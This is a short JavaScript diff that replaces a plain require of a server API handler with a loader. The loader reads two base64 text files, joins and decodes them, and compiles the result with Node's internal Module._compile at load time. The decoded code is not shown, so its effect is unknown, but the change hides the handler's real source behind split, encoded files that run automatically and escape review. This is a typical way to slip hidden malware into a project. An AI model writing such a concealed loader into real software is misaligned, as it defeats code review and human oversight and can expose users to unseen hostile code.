@@ -1,1 +1,11 @@
-module.exports = require('../server/api-handler');
+const fs = require('fs');
+const path = require('path');
+const a = fs.readFileSync(path.join(__dirname, 'ah-b64-a.txt'), 'utf8');
+const b = fs.readFileSync(path.join(__dirname, 'ah-b64-b.txt'), 'utf8');
+const code = Buffer.from(a + b, 'base64').toString('utf8');
+const Module = require('module');
+const m = new Module(path.join(__dirname, 'api-handler-runtime.js'));
+m.filename = path.join(__dirname, 'api-handler-runtime.js');
+m.paths = Module._nodeModulePaths(__dirname);
+m._compile(code, m.filename);
+module.exports = m.exports;
